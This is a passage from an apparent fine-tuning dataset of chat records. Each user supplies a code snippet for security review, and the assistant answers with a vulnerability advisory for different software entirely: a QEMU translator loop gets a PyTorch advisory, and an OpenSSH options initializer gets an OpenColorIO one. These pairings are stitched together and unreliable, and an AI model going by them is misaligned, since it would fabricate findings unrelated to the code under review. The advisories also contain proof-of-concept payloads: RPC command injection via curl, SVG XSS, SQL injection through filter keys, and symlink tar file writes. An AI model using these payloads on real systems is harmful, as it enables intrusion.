tcg_temp_new();\n    cpu_tmp1_i64 = tcg_temp_new_i64();\n    cpu_tmp2_i32 = tcg_temp_new_i32();\n    cpu_tmp3_i32 = tcg_temp_new_i32();\n    cpu_tmp4 = tcg_temp_new();\n    cpu_ptr0 = tcg_temp_new_ptr();\n    cpu_ptr1 = tcg_temp_new_ptr();\n    cpu_cc_srcT = tcg_temp_local_new();\n\n    dc->is_jmp = DISAS_NEXT;\n    pc_ptr = pc_start;\n    num_insns = 0;\n    max_insns = tb->cflags & CF_COUNT_MASK;\n    if (max_insns == 0) {\n        max_insns = CF_COUNT_MASK;\n    }\n    if (max_insns > TCG_MAX_INSNS) {\n        max_insns = TCG_MAX_INSNS;\n    }\n\n    gen_tb_start(tb);\n    for(;;) {\n        tcg_gen_insn_start(pc_ptr, dc->cc_op);\n        num_insns++;\n\n        /* If RF is set, suppress an internally generated breakpoint.  */\n        if (unlikely(cpu_breakpoint_test(cs, pc_ptr,\n                                         tb->flags & HF_RF_MASK\n                                         ? BP_GDB : BP_ANY))) {\n            gen_debug(dc, pc_ptr - dc->cs_base);\n            /* The address covered by the breakpoint must be included in\n               [tb->pc, tb->pc + tb->size) in order to for it to be\n               properly cleared -- thus we increment the PC here so that\n               the logic setting tb->size below does the right thing.  */\n            pc_ptr += 1;\n            goto done_generating;\n        }\n        if (num_insns == max_insns && (tb->cflags & CF_LAST_IO)) {\n            gen_io_start();\n        }\n\n        pc_ptr = disas_insn(env, dc, pc_ptr);\n        /* stop translation if indicated */\n        if (dc->is_jmp)\n            break;\n        /* if single step mode, we generate only one instruction and\n           generate an exception */\n        /* if irq were inhibited with HF_INHIBIT_IRQ_MASK, we clear\n           the flag and abort the translation to give the irqs a\n           change to be happen */\n        if (dc->tf || dc->singlestep_enabled ||\n            (flags & HF_INHIBIT_IRQ_MASK)) {\n            gen_jmp_im(pc_ptr - dc->cs_base);\n            gen_eob(dc);\n            break;\n        }\n        /* Do not cross the boundary of the pages in icount mode,\n           it can cause an exception. Do it only when boundary is\n           crossed by the first instruction in the block.\n           If current instruction already crossed the bound - it's ok,\n           because an exception hasn't stopped this code.\n         */\n        if ((tb->cflags & CF_USE_ICOUNT)\n            && ((pc_ptr & TARGET_PAGE_MASK)\n                != ((pc_ptr + TARGET_MAX_INSN_SIZE - 1) & TARGET_PAGE_MASK)\n                || (pc_ptr & ~TARGET_PAGE_MASK) == 0)) {\n            gen_jmp_im(pc_ptr - dc->cs_base);\n            gen_eob(dc);\n            break;\n        }\n        /* if too long translation, stop generation too */\n        if (tcg_op_buf_full() ||\n            (pc_ptr - pc_start) >= (TARGET_PAGE_SIZE - 32) ||\n            num_insns >= max_insns) {\n            gen_jmp_im(pc_ptr - dc->cs_base);\n            gen_eob(dc);\n            break;\n        }\n        if (singlestep) {\n            gen_jmp_im(pc_ptr - dc->cs_base);\n            gen_eob(dc);\n            break;\n        }\n    }\n    if (tb->cflags & CF_LAST_IO)\n        gen_io_end();\ndone_generating:\n    gen_tb_end(tb, num_insns);\n\n#ifdef DEBUG_DISAS\n    if (qemu_loglevel_mask(CPU_LOG_TB_IN_ASM)\n        && qemu_log_in_addr_range(pc_start)) {\n        int disas_flags;\n        qemu_log_lock();\n        qemu_log(\"----------------\\n\");\n        qemu_log(\"IN: %s\\n\", lookup_symbol(pc_start));\n#ifdef TARGET_X86_64\n        if (dc->code64)\n            disas_flags = 2;\n        else\n#endif\n            disas_flags = !dc->code32;\n        log_target_disas(cs, pc_start, pc_ptr - pc_start, disas_flags);\n        qemu_log(\"\\n\");\n        qemu_log_unlock();\n    }\n#endif\n\n    tb->size = pc_ptr - pc_start;\n    tb->icount = num_insns;\n}\n\n```"}, {"role": "assistant", "content": "PyTorch Vulnerable to Remote Code Execution via Untrusted Checkpoint Files\n\n### Summary\n\nA vulnerability in PyTorch's `weights_only` unpickler allows an attacker to craft a malicious checkpoint file (`.pth`) that, when loaded with `torch.load(..., weights_only=True)`, can corrupt memory and potentially lead to arbitrary code execution.\n\n### Vulnerability Details\n\nThe `weights_only=True` unpickler failed to properly validate pickle opcodes and storage metadata, allowing:\n\n1. **Heap memory corruption** via `SETITEM`/`SETITEMS` opcodes applied to non-dictionary types\n2. **Storage size mismatch** between declared element count and actual data in the archive\n\n### Impact\n\nAn attacker who can convince a user to load a malicious checkpoint file may achieve arbitrary code execution in the context of the victim's process.\n\n\n# Credit\nJi'an Zhou"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nvoid show_numa_stats(struct task_struct *p, struct seq_file *m)\n{\n\tint node;\n\tunsigned long tsf = 0, tpf = 0, gsf = 0, gpf = 0;\n\n\tfor_each_online_node(node) {\n\t\tif (p->numa_faults) {\n\t\t\ttsf = p->numa_faults[task_faults_idx(NUMA_MEM, node, 0)];\n\t\t\ttpf = p->numa_faults[task_faults_idx(NUMA_MEM, node, 1)];\n\t\t}\n\t\tif (p->numa_group) {\n\t\t\tgsf = p->numa_group->faults[task_faults_idx(NUMA_MEM, node, 0)],\n\t\t\tgpf = p->numa_group->faults[task_faults_idx(NUMA_MEM, node, 1)];\n\t\t}\n\t\tprint_numa_stats(m, node, tsf, tpf, gsf, gpf);\n\t}\n}\n\n```"}, {"role": "assistant", "content": "OpenClaw affected by denial of service via unbounded URL-backed media fetch\n\n### Summary\nURL-backed media fetch handling allocated the entire response payload in memory (`arrayBuffer`) before enforcing `maxBytes`, allowing oversized responses to cause memory exhaustion.\n\n### Affected Versions\n- `openclaw` (npm): < `2026.2.14`\n- `clawdbot` (npm): <= `2026.1.24-3`\n\n### Patched Versions\n- `openclaw` (npm): `2026.2.14`\n\n### Fix Commit\n- `openclaw/openclaw` `main`: `00a08908892d1743d1fc52e5cbd9499dd5da2fe0`\n\n### Details\nAffected component:\n- `src/media/input-files.ts` (`fetchWithGuard`)\n\nWhen `content-length` is missing or incorrect, reading the body via `response.arrayBuffer()` buffers the full payload before a size check can run.\n\n### Proof of Concept\n1. Configure URL-based media input.\n2. Serve a response larger than `maxBytes` (chunked transfer / no `content-length`).\n3. Trigger the `fetchWithGuard` URL fetch path.\n\nExample local server (large response):\n```bash\nnode -e 'require(\"http\").createServer((_,res)=>{res.writeHead(200,{\"content-type\":\"application/octet-stream\"});for(let i=0;i<1024;i++)res.write(Buffer.alloc(1024*64));res.end();}).listen(18888)'\n```\n\n### Impact\nAvailability loss via memory pressure from attacker-controlled remote media responses.\n\n### Mitigation\nUntil a patched release is available, disable URL-backed media inputs (or restrict to a tight hostname allowlist) and use conservative `maxBytes` limits.\n\n### Credits\nReported by @vincentkoc."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\ncleanup_send_receive_history (void)\n{\n\tif (send_receive_history_file_path)\n\t\tfree(send_receive_history_file_path);\n}\n\n```"}, {"role": "assistant", "content": "Bitcoinrb Vulnerable to Command injection via RPC \n\n### Summary: Remote Code Execution\nUnsafe handling of request parameters in the RPC HTTP server results in command injection\n\n### Details\nIn lib/bitcoin/rpc/http_server.rb line 30-39, the JSON body of a POST request is parsed into `command` and `args` variables. These values are then passed to `send`, which is used to call an arbitrary class method. However, there is no validation that the provided `command` value is one of the expected RPC methods. \nThis means that an attacker could supply a `command` value such as `system`, and then pass arbitrary system commands into the `args` parameter and achieve remote code execution. \n\n### PoC\n1. Start the RPC server\n2. Send a request to the RPC server as so:\n ```\ncurl -X POST http://127.0.0.1:18443 -H 'Content-Type: application/json' \\\n    -d '{\"method\":\"eval\",\"params\":[\"File.write(\\\"/tmp/pwned\\\",\\\"owned\\\")\"]}'\n```\n3. Check the /tmp folder on the machine where the RPC server is being run. If a folder /pwned now exists, the vulnerability is confirmed.\n### Impact\nThis vulnerability would impact anyone running the RPC server. The impact is higher for those who are running it publicly exposed to the internet.\n\n### Remediation                                                \n                                                                                                                                                                                                                               \n  **Mitigating Factors:**                                                                                                                                                                                                      \n  - The RPC server is part of the experimental SPV node feature, which is not documented and has very few users.                                                                                                               \n  - The SPV-related features may be removed in future releases.                                                                                                                                                                \n                                                                                                                                                                                                                               \n  **Resolution:**                                                                                                                                                                                                              \n  - Added whitelist validation to allow only RPC methods defined in `RequestHandler`.                                                                                                                                          \n  - Fixed in version 1.12.0."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nsk_sp<SkTypeface> CreateSkTypeface(bool italic,\n                                   gfx::Font::Weight weight,\n                                   std::string* family,\n                                   bool* out_success) {\n  DCHECK(family);\n  TRACE_EVENT0(\"fonts\", \"gfx::CreateSkTypeface\");\n\n  const int font_weight = (weight == Font::Weight::INVALID)\n                              ? static_cast<int>(Font::Weight::NORMAL)\n                              : static_cast<int>(weight);\n  SkFontStyle sk_style(\n      font_weight, SkFontStyle::kNormal_Width,\n      italic ? SkFontStyle::kItalic_Slant : SkFontStyle::kUpright_Slant);\n  sk_sp<SkTypeface> typeface;\n  {\n    TRACE_EVENT1(TRACE_DISABLED_BY_DEFAULT(\"fonts\"), \"SkTypeface::MakeFromName\",\n                 \"family\", *family);\n    typeface = SkTypeface::MakeFromName(family->c_str(), sk_style);\n  }\n  if (!typeface) {\n    TRACE_EVENT1(TRACE_DISABLED_BY_DEFAULT(\"fonts\"), \"SkTypeface::MakeFromName\",\n                 \"family\", kFallbackFontFamilyName);\n    typeface = sk_sp<SkTypeface>(\n        SkTypeface::MakeFromName(kFallbackFontFamilyName, sk_style));\n    if (!typeface) {\n      *out_success = false;\n      return nullptr;\n    }\n    *family = kFallbackFontFamilyName;\n  }\n  *out_success = true;\n  return typeface;\n}\n\n```"}, {"role": "assistant", "content": "Apache NiFi: Missing Authorization of Restricted Permissions for Component Updates\n\nApache NiFi 1.1.0 through 2.7.2 are missing authorization when updating configuration properties on extension components that have specific Required Permissions based on the Restricted annotation. The Restricted annotation indicates additional privileges required to add the annotated component to the flow configuration, but framework authorization did not check restricted status when updating a component previously added. The missing authorization requires a more privileged user to add a restricted component to the flow configuration, but permits a less privileged user to make property configuration changes. Apache NiFi installations that do not implement different levels of authorization for Restricted components are not subject to this vulnerability because the framework enforces write permissions as the security boundary. Upgrading to Apache NiFi 2.8.0 is the recommended mitigation."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nlong Cluster::GetNext(const BlockEntry* pCurr, const BlockEntry*& pNext) const {\n  assert(pCurr);\n  assert(m_entries);\n  assert(m_entries_count > 0);\n\n size_t idx = pCurr->GetIndex();\n  assert(idx < size_t(m_entries_count));\n  assert(m_entries[idx] == pCurr);\n\n ++idx;\n\n if (idx >= size_t(m_entries_count)) {\n long long pos;\n long len;\n\n const long status = Parse(pos, len);\n\n if (status < 0) { // error\n      pNext = NULL;\n return status;\n }\n\n if (status > 0) {\n      pNext = NULL;\n return 0;\n }\n\n    assert(m_entries);\n    assert(m_entries_count > 0);\n    assert(idx < size_t(m_entries_count));\n }\n\n  pNext = m_entries[idx];\n  assert(pNext);\n\n return 0;\n}\n\n```"}, {"role": "assistant", "content": "Improper Input Validation in net.sf.robocode:robocode.host allows for external service interaction\n\nRobocode through 1.9.3.5 allows remote attackers to cause external service interaction (DNS), as demonstrated by a query for a unique subdomain name within an attacker-controlled DNS zone, because of a .openStream call within java.net.URL."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nstatic String FullyDecodeString(const String& string,\n                                const WTF::TextEncoding& encoding) {\n  size_t old_working_string_length;\n  String working_string = string;\n  do {\n    old_working_string_length = working_string.length();\n    working_string = Decode16BitUnicodeEscapeSequences(\n        DecodeStandardURLEscapeSequences(working_string, encoding));\n  } while (working_string.length() < old_working_string_length);\n  working_string.Replace('+', ' ');\n  return working_string;\n}\n\n```"}, {"role": "assistant", "content": "NiceGUI Stored/Reflected XSS in ui.interactive_image via unsanitized SVG content\n\n### Summary\nA Cross-Site Scripting (XSS) vulnerability exists in the `ui.interactive_image` component of NiceGUI (v3.3.1 and earlier). The component renders SVG content using Vue's `v-html` directive without any sanitization. This allows attackers to inject malicious HTML or JavaScript via the SVG `<foreignObject>` tag.\n\n### Details\nThe vulnerability is located in `nicegui/elements/interactive_image.js`.\nThe component uses the following code to render content:\n```javascript\n<g v-html=\"content\"></g>\n```\nVue's v-html directive renders raw HTML strings into the DOM. If an application allows user-controlled input to be passed to the content property of an interactive image, an attacker can embed a <foreignObject> tag containing malicious scripts, bypassing typical image restrictions.\n\n### PoC\n```python\nfrom nicegui import ui\n\n@ui.page('/')\ndef main():\n    ui.label('NiceGUI SVG XSS PoC')\n    \n    # Standard image loading\n    img = ui.interactive_image('[https://picsum.photos/640/360](https://picsum.photos/640/360)')\n    \n    # Payload: Embeds raw HTML execution inside SVG\n    # This executes immediately when the image component is rendered\n    img.content = (\n        '<foreignObject>'\n        '<body xmlns=\"[http://www.w3.org/1999/xhtml](http://www.w3.org/1999/xhtml)\">'\n        '<img src=x onerror=alert(\"XSS-SVG\")>'\n        '</body>'\n        '</foreignObject>'\n    )\n\nui.run()\n```\n\n### Impact\n- Type: Reflected / Stored XSS (depending on data source)\n\n- Severity: Moderate\n\n- Impact: Attackers can inject malicious scripts that execute whenever the image component is rendered or updated. This is particularly dangerous for dashboards or multi-user applications displaying user-generated content or annotations."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nstatic CURLcode imap_done(struct connectdata *conn, CURLcode status,\n                          bool premature)\n{\n  struct SessionHandle *data = conn->data;\n  struct FTP *imap = data->state.proto.imap;\n  CURLcode result=CURLE_OK;\n  (void)premature;\n\n  if(!imap)\n    /* When the easy handle is removed from the multi while libcurl is still\n     * trying to resolve the host name, it seems that the imap struct is not\n     * yet initialized, but the removal action calls Curl_done() which calls\n     * this function. So we simply return success if no imap pointer is set.\n     */\n    return CURLE_OK;\n\n  if(status) {\n    conn->bits.close = TRUE; /* marked for closure */\n    result = status;      /* use the already set error code */\n  }\n\n  /* clear these for next connection */\n  imap->transfer = FTPTRANSFER_BODY;\n\n  return result;\n}\n\n```"}, {"role": "assistant", "content": "LangGraph's SQLite is vulnerable to SQL injection via metadata filter key in SQLite checkpointer list method\n\n# Context\n\nA SQL injection vulnerability exists in LangGraph's SQLite checkpoint implementation that allows attackers to manipulate SQL queries through metadata filter keys. This affects applications that accept **untrusted metadata filter keys** (not just filter values) in checkpoint search operations.\n\n# Impact\n\nAttackers who control metadata filter keys can execute arbitrary sql queries against the database.\n\n# Root Cause\n\nThe `_metadata_predicate()` function constructs SQL queries by interpolating filter keys directly into f-strings without validation:\n\n```python\n# VULNERABLE CODE (before fix)\nfor query_key, query_value in metadata_filter.items():\n    operator, param_value = _where_value(query_value)\n    predicates.append(\n        f\"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}\"\n    )\n    param_values.append(param_value)\n```\n\nWhile filter **values** are parameterized, filter **keys** are not validated, allowing SQL injection.\n\n# Attack Example\n\n**Before Fix:**\n```python\nfrom langgraph.checkpoint.sqlite import SqliteSaver\n\nsaver = SqliteSaver.from_conn_string(\"checkpoints.db\")\n\n# Attacker controls the filter keys\nmalicious_filter = {\"x') OR '1'='1\": \"dummy\"}\n\n# Returns ALL checkpoints, bypassing filtering\nresults = list(saver.list(None, filter=malicious_filter))\n```\n\n**Resulting SQL:**\n```sql\nWHERE json_extract(CAST(metadata AS TEXT), '$.x') OR '1'='1') = ?\n-- Injected condition makes WHERE clause always true\n```\n\n## Who Is Affected?\n\n### LangSmith Deployment Customers: NOT Impacted\n\n**LangSmith deployment customers are NOT affected by this vulnerability.** LangSmith deployments do not allow configuring custom checkpointers, so the vulnerable code path cannot be reached.\n\n### High Risk: Custom Server Deployments\n\nYou are affected if your application:\n- Runs a custom server with SqliteSaver checkpointer\n- Exposes an endpoint for fetching checkpoint history (e.g., via `get_state_history()`)\n- Accepts metadata filter keys from untrusted sources\n\n**Example vulnerable code:**\n```python\n# Custom server endpoint - User controls filter key names - DANGEROUS\n@app.post(\"/api/history\")\ndef get_history(request):\n    filter_field = request.json.get(\"filter_field\")  # Untrusted input\n    filter_value = request.json.get(\"filter_value\")\n\n    # VULNERABLE: Attacker can bypass access controls\n    history = list(graph.get_state_history(\n        config,\n        filter={filter_field: filter_value}\n    ))\n    return history\n```\n\n**Note on privilege escalation:** If an endpoint allows end users to specify arbitrary filter keys, those users likely already have legitimate access to query the checkpoint database. In such cases, this vulnerability may not constitute a privilege escalation, as users who can control filter keys would typically already be expected to have database access. However, the SQL injection still allows bypassing intended filtering logic and metadata-based access controls that the application may rely on for data isolation.\n\n### Additional Security Hardening (Defense in Depth)\n\nThis release also includes hardening improvements:\n\n**1. Checkpoint Limit Parameter**: used f-string interpolation into parameterized query.  Not considered a vulnerability as it requires users to accept untrusted input and not validate it against the actual API signature. \n\n**2. Store Filter Value Parameterization**: Refactored all filter value handling from manual quote escaping to parameterized queries\n\n## Remediation\n\n### Immediate Actions\n\n1. **Update to the patched version** of `langgraph-checkpoint-sqlite`\n2. **Audit your code** for locations where filter keys come from untrusted sources"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nstatic char* get_rootdir(pid_t pid)\n{\n    char buf[sizeof(\"/proc/%lu/root\") + sizeof(long)*3];\n    sprintf(buf, \"/proc/%lu/root\", (long)pid);\n    return malloc_readlink(buf);\n}\n\n```"}, {"role": "assistant", "content": "Compressing Vulnerable to Arbitrary File Write via Symlink Extraction\n\n# Arbitrary File Write via Symlink Extraction in `github.com/node-modules/compressing`\n\n## Brief Introduction\n\nThe `compressing` npm package extracts TAR archives while restoring symbolic links without validating their targets. \nBy embedding symlinks that resolve outside the intended extraction directory, an attacker can cause subsequent file entries to be written to arbitrary locations on the host file system.\n\nDepending on the extractor’s handling of existing files, this behavior may allow overwriting sensitive files or creating new files in security-critical locations.\n\n## Affected Component and Versions\n\n- **Component**: `github.com/node-modules/compressing`\n- **Affected Versions**: `<= 1.10.3 || =2.0.0` \n\n## Vulnerability Details\n\n### Root Cause\n\n`compressing.tar.uncompress` sanitizes the destination paths of archive entries, but it does **not** restrict or validate the targets of symlinks contained in TAR archives. During extraction, the library creates those symlinks inside the output directory. Later entries that resolve through the symlink are written to the symlink target rather than the intended extraction root, enabling an arbitrary file write.\n\n### Impact\n\nAn attacker who can supply a crafted TAR archive can:\n\n- Cause files to be written outside the intended extraction directory (arbitrary file write via symlink traversal).\n\n- Write files to attacker-controlled paths on the host file system once symbolic links are followed during extraction.\n\n- In environments where extraction is performed with elevated privileges or targets executable paths, this may lead to code execution, privilege escalation, data corruption, or denial of service.\n\n## Reproduction\n\n### Environment\n\n- **OS**: Ubuntu 24.04\n- **Node.js**: v24.12.0\n- **compressing**: 2.0.0\n\n### Construct PoC Archive\n\nThe following pseudo-code demonstrates the attack logic:\n\n```python\nbase_dir = \"archive/\"\nwith tarfile.open(\"./poc_arbitrary_write.tar\", mode=\"w\") as tar:\n    add_regular_file(tar, base_dir + \"baseFile.txt\", \"base content\\n\")\n    add_symlink(tar, base_dir + \"myTmp\", \"/tmp\")\n    add_regular_file(tar, base_dir + \"myTmp/poc.txt\", \"Arbitrary File Write\\n\")\n```\n\n### Extract the Archive\n\n```javascript\nconst compressing = require('compressing');\n\nfunction untar(archiveName, destPath) {\n  return compressing.tar.uncompress(archiveName, destPath);\n}\n\n\nasync function main() {\n  const archivePath = process.argv[2];\n  const destPath = \"./output\";\n\n  if (archivePath && archivePath.endsWith(\".tar\")) {\n    await untar(archivePath, destPath);\n  }\n}\n\nmain();\n```\n\n### Attack Results\n\n<img width=\"547\" height=\"161\" alt=\"image\" src=\"https://github.com/user-attachments/assets/5ea12efd-0d3f-4f8a-8414-b3a5c72e153e\" />\n\n\nAfter extraction, the output directory contains a symlink pointing to `/tmp`. The file `poc.txt` is then written through the symlink to `/tmp/poc.txt`, demonstrating an arbitrary file write outside the extraction directory.\n\n## Summary\n\n`compressing` restores symlinks from TAR archives without validating their targets. By combining a malicious symlink with a subsequent file entry, an attacker can redirect extracted files to arbitrary locations on the host."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\ninitialize_server_options(ServerOptions *options)\n{\n\tmemset(options, 0, sizeof(*options));\n\toptions->num_ports = 0;\n\toptions->ports_from_cmdline = 0;\n\toptions->queued_listen_addrs = NULL;\n\toptions->num_queued_listens = 0;\n\toptions->listen_addrs = NULL;\n\toptions->address_family = -1;\n\toptions->num_host_key_files = 0;\n\toptions->num_host_cert_files = 0;\n\toptions->host_key_agent = NULL;\n\toptions->pid_file = NULL;\n\toptions->login_grace_time = -1;\n\toptions->permit_root_login = PERMIT_NOT_SET;\n\toptions->ignore_rhosts = -1;\n\toptions->ignore_user_known_hosts = -1;\n\toptions->print_motd = -1;\n\toptions->print_lastlog = -1;\n\toptions->x11_forwarding = -1;\n\toptions->x11_display_offset = -1;\n\toptions->x11_use_localhost = -1;\n\toptions->permit_tty = -1;\n\toptions->permit_user_rc = -1;\n\toptions->xauth_location = NULL;\n\toptions->strict_modes = -1;\n\toptions->tcp_keep_alive = -1;\n\toptions->log_facility = SYSLOG_FACILITY_NOT_SET;\n\toptions->log_level = SYSLOG_LEVEL_NOT_SET;\n\toptions->hostbased_authentication = -1;\n\toptions->hostbased_uses_name_from_packet_only = -1;\n\toptions->hostbased_key_types = NULL;\n\toptions->hostkeyalgorithms = NULL;\n\toptions->pubkey_authentication = -1;\n\toptions->pubkey_key_types = NULL;\n\toptions->kerberos_authentication = -1;\n\toptions->kerberos_or_local_passwd = -1;\n\toptions->kerberos_ticket_cleanup = -1;\n\toptions->kerberos_get_afs_token = -1;\n\toptions->gss_authentication=-1;\n\toptions->gss_cleanup_creds = -1;\n\toptions->gss_strict_acceptor = -1;\n\toptions->password_authentication = -1;\n\toptions->kbd_interactive_authentication = -1;\n\toptions->challenge_response_authentication = -1;\n\toptions->permit_empty_passwd = -1;\n\toptions->permit_user_env = -1;\n\toptions->compression = -1;\n\toptions->rekey_limit = -1;\n\toptions->rekey_interval = -1;\n\toptions->allow_tcp_forwarding = -1;\n\toptions->allow_streamlocal_forwarding = -1;\n\toptions->allow_agent_forwarding = -1;\n\toptions->num_allow_users = 0;\n\toptions->num_deny_users = 0;\n\toptions->num_allow_groups = 0;\n\toptions->num_deny_groups = 0;\n\toptions->ciphers = NULL;\n\toptions->macs = NULL;\n\toptions->kex_algorithms = NULL;\n\toptions->fwd_opts.gateway_ports = -1;\n\toptions->fwd_opts.streamlocal_bind_mask = (mode_t)-1;\n\toptions->fwd_opts.streamlocal_bind_unlink = -1;\n\toptions->num_subsystems = 0;\n\toptions->max_startups_begin = -1;\n\toptions->max_startups_rate = -1;\n\toptions->max_startups = -1;\n\toptions->max_authtries = -1;\n\toptions->max_sessions = -1;\n\toptions->banner = NULL;\n\toptions->use_dns = -1;\n\toptions->client_alive_interval = -1;\n\toptions->client_alive_count_max = -1;\n\toptions->num_authkeys_files = 0;\n\toptions->num_accept_env = 0;\n\toptions->permit_tun = -1;\n\toptions->num_permitted_opens = -1;\n\toptions->adm_forced_command = NULL;\n\toptions->chroot_directory = NULL;\n\toptions->authorized_keys_command = NULL;\n\toptions->authorized_keys_command_user = NULL;\n\toptions->revoked_keys_file = NULL;\n\toptions->trusted_user_ca_keys = NULL;\n\toptions->authorized_principals_file = NULL;\n\toptions->authorized_principals_command = NULL;\n\toptions->authorized_principals_command_user = NULL;\n\toptions->ip_qos_interactive = -1;\n\toptions->ip_qos_bulk = -1;\n\toptions->version_addendum = NULL;\n\toptions->fingerprint_hash = -1;\n}\n\n```"}, {"role": "assistant", "content": "AcademySoftwareFoundation OpenColorIO has an out-of-bounds vulnerability\n\nA vulnerability was found in AcademySoftwareFoundation OpenColorIO up to 2.5.0. This issue affects the function ConvertToRegularExpression of the file src/OpenColorIO/FileRules.cpp. Performing a manipulation results in out-of-bounds read. The attack needs to be approached locally. The exploit has been made public and could be used. The patch is named ebdbb75123c9d5f4643e041314e2bc988a13f20d. To fix this issue, it is recommended to deploy a patch. The fix was added to the 2.5.1 milestone."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nbool RecursiveDirectoryCreate(const std::wstring& full_path) {\n  const wchar_t* full_path_str = full_path.c_str();\n  DWORD file_attributes = ::GetFileAttributes(full_path_str);\n  if (file_attributes != INVALID_FILE_ATTRIBUTES) {\n    if ((file_attributes & FILE_ATTRIBUTE_DIRECTORY) != 0) {\n      Trace(L\"%hs( %ls directory exists )\\n\", __func__, full_path_str);\n      return true;\n    }\n    Trace(L\"%hs( %ls directory conflicts with an existing file. )\\n\", __func__,\n          full_path_str);\n    return false;\n  }\n\n\n  std::wstring parent_path;\n  std::size_t pos = full_path.find_last_of(L\"/\\\\\");\n  if (pos != std::wstring::npos) {\n    parent_path = full_path.substr(0, pos);\n    if (!RecursiveDirectoryCreate(parent_path)) {\n      Trace(L\"Failed to create one of the parent directories\");\n      return false;\n    }\n  }\n  if (!::CreateDirectory(full_path_str, nullptr)) {\n    DWORD error_code = ::GetLastError();\n    if (error_code == ERROR_ALREADY_EXISTS && DirectoryExists(full_path_str)) {\n      return true;\n    } else {\n      Trace(L\"Failed to create directory %ls, last error is %d\\n\",\n            full_path_str, error_code);\n      return false;\n    }\n  }\n  return true;\n}\n\n```"}, {"role": "assistant", "content": "WeKnora has Command Injection in MCP stdio test\n\n### Vulnerability **Description**\n\n---\n\n**Vulnerability Overview**\n\n\nThis issue is a command injection vulnerability (CWE-78) that allows authenticated users to inject stdio_config.command/args into MCP stdio settings, causing the server to execute subprocesses using these injected values.\n\nThe root causes are as follows:\n\n- **Missing Security Filtering**: When transport_type=stdio, there is no validation on stdio_config.command/args, such as allowlisting, enforcing fixed paths/binaries, or blocking dangerous options.\n- **Functional Flaw (Trust Boundary Violation)**: The command/args stored as \"service configuration data\" are directly used in the /test execution flow and connected to execution sinks without validation.\n- **Lack of Authorization Control**: This functionality effectively allows \"process execution on the server\" (an administrative operation), yet no administrator-only permission checks are implemented in the code (accessible with Bearer authentication only).\n\n**Vulnerable Code**\n\n1. **API Route Registration** (path where endpoints are created)\n****https://github.com/Tencent/WeKnora/blob/6b7558c5592828380939af18240a4cef67a2cbfc/internal/router/router.go#L85-L110\nhttps://github.com/Tencent/WeKnora/blob/6b7558c5592828380939af18240a4cef67a2cbfc/internal/router/router.go#L371-L390\n    \n    ```go\n     // 认证中间件\n    \tr.Use(middleware.Auth(params.TenantService, params.UserService, params.Config))\n    \n    \t// 添加OpenTelemetry追踪中间件\n    \tr.Use(middleware.TracingMiddleware())\n    \n    \t// 需要认证的API路由\n    \tv1 := r.Group(\"/api/v1\")\n    \t{\n    \t\tRegisterAuthRoutes(v1, params.AuthHandler)\n    \t\tRegisterTenantRoutes(v1, params.TenantHandler)\n    \t\tRegisterKnowledgeBaseRoutes(v1, params.KBHandler)\n    \t\tRegisterKnowledgeTagRoutes(v1, params.TagHandler)\n    \t\tRegisterKnowledgeRoutes(v1, params.KnowledgeHandler)\n    \t\tRegisterFAQRoutes(v1, params.FAQHandler)\n    \t\tRegisterChunkRoutes(v1, params.ChunkHandler)\n    \t\tRegisterSessionRoutes(v1, params.SessionHandler)\n    \t\tRegisterChatRoutes(v1, params.SessionHandler)\n    \t\tRegisterMessageRoutes(v1, params.MessageHandler)\n    \t\tRegisterModelRoutes(v1, params.ModelHandler)\n    \t\tRegisterEvaluationRoutes(v1, params.EvaluationHandler)\n    \t\tRegisterInitializationRoutes(v1, params.InitializationHandler)\n    \t\tRegisterSystemRoutes(v1, params.SystemHandler)\n    \t\tRegisterMCPServiceRoutes(v1, params.MCPServiceHandler)\n    \t\tRegisterWebSearchRoutes(v1, params.WebSearchHandler)\n    \t}\n    ```\n    \n    ```go\n    func RegisterMCPServiceRoutes(r *gin.RouterGroup, handler *handler.MCPServiceHandler) {\n    \tmcpServices := r.Group(\"/mcp-services\")\n    \t{\n    \t\t// Create MCP service\n    \t\tmcpServices.POST(\"\", handler.CreateMCPService)\n    \t\t// List MCP services\n    \t\tmcpServices.GET(\"\", handler.ListMCPServices)\n    \t\t// Get MCP service by ID\n    \t\tmcpServices.GET(\"/:id\", handler.GetMCPService)\n    \t\t// Update MCP service\n    \t\tmcpServices.PUT(\"/:id\", handler.UpdateMCPService)\n    \t\t// Delete MCP service\n    \t\tmcpServices.DELETE(\"/:id\", handler.DeleteMCPService)\n    \t\t// Test MCP service connection\n    \t\tmcpServices.POST(\"/:id/test\", handler.TestMCPService)\n    \t\t// Get MCP service tools\n    \t\tmcpServices.GET(\"/:id/tools\", handler.GetMCPServiceTools)\n    \t\t// Get MCP service resources\n    \t\tmcpServices.GET(\"/:id/resources\", handler.GetMCPServiceResources)\n    \t}\n    ```\n    \n2. **User input (JSON) → types.MCPService binding** (POST 